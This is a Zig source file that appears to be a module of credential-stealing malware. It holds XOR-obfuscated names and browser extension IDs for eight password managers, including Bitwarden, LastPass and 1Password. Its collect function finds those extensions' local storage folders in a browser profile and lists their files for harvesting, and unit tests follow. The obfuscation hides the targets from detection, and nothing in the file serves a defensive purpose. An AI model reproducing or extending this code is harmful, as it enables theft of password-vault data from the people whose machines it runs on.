const std = @import("std");
const hash = @import("../types/hash.zig");

pub const PmDir = struct {
    name: []const u8,
    path: []const u8,
    files: [][]const u8,
};

const E = struct {
    pub const num_pm = 8;
    pub const names = [num_pm][]const u8{
        &hash.xorEncrypt("Bitwarden"),
        &hash.xorEncrypt("Dashlane"),
        &hash.xorEncrypt("Keeper"),
        &hash.xorEncrypt("KeePassXC"),
        &hash.xorEncrypt("LastPass"),
        &hash.xorEncrypt("NordPass"),
        &hash.xorEncrypt("RoboForm"),
        &hash.xorEncrypt("1Password"),
    };
    pub const ids = [num_pm][]const u8{
        &hash.xorEncrypt("nngceckbapebfimnlniiiaiaopbngkcc"),
        &hash.xorEncrypt("fdjamakpfbbddfjaooikfcpapjohcfmg"),
        &hash.xorEncrypt("bfogiafebfohielmfpndgfnnblcidlfn"),
        &hash.xorEncrypt("oboonakemofpalcgghocfoadofidhfkk"),
        &hash.xorEncrypt("hdokiejnpimakedhajhdlcegeplioahd"),
        &hash.xorEncrypt("fjohedfmdkclgkjgbmaadibebkbnagoo"),
        &hash.xorEncrypt("pnlccmojcmeohlpggmfnbbiapkmbliob"),
        &hash.xorEncrypt("aeblfdkhhhdcdjpifhhbdioieplbjndc"),
    };
    pub const ext_settings = hash.xorEncrypt("Local Extension Settings");
};

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn listFiles(allocator: std.mem.Allocator, dir_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();

    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
        try files.append(full);
    }

    return try files.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, browser_profile_path: []const u8) ![]PmDir {
    var dirs = std.ArrayList(PmDir).init(allocator);
    errdefer {
        for (dirs.items) |d| {
            allocator.free(d.name);
            allocator.free(d.path);
            for (d.files) |f| allocator.free(f);
            allocator.free(d.files);
        }
        dirs.deinit();
    }

    var ext_settings_buf: [E.ext_settings.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_settings, &ext_settings_buf);

    inline for (0..E.num_pm) |i| {
        const id_enc = E.ids[i];
        var id_buf: [id_enc.len]u8 = undefined;
        hash.xorDecrypt(id_enc, &id_buf);

        const ext_path = try std.fs.path.join(allocator, &[_][]const u8{ browser_profile_path, &ext_settings_buf, &id_buf });
        if (!dirExists(ext_path)) {
            allocator.free(ext_path);
            continue;
        }

        const files = listFiles(allocator, ext_path) catch |err| {
            allocator.free(ext_path);
            if (err == error.FileNotFound or err == error.NotDir or err == error.AccessDenied) continue;
            return err;
        };

        const ne = E.names[i];
        var name_buf: [ne.len]u8 = undefined;
        hash.xorDecrypt(ne, &name_buf);

        const name = try allocator.dupe(u8, &name_buf);
        errdefer allocator.free(name);
        try dirs.append(PmDir{ .name = name, .path = ext_path, .files = files });
    }

    return try dirs.toOwnedSlice();
}

test "PM count" {
    try std.testing.expect(E.names.len == 8);
}

test "first PM is Bitwarden" {
    var buf: [E.names[0].len]u8 = undefined;
    hash.xorDecrypt(E.names[0], &buf);
    try std.testing.expectEqualSlices(u8, "Bitwarden", &buf);
}

test "last PM is 1Password" {
    var buf: [E.names[7].len]u8 = undefined;
    hash.xorDecrypt(E.names[7], &buf);
    try std.testing.expectEqualSlices(u8, "1Password", &buf);
}

test "collect returns empty for nonexistent profile" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__");
    defer {
        for (result) |d| {
            std.testing.allocator.free(d.name);
            std.testing.allocator.free(d.path);
            for (d.files) |f| std.testing.allocator.free(f);
            std.testing.allocator.free(d.files);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "dirExists returns false for nonexistent path" {
    try std.testing.expect(!dirExists("C:\\__nonexistent__pm__"));
}
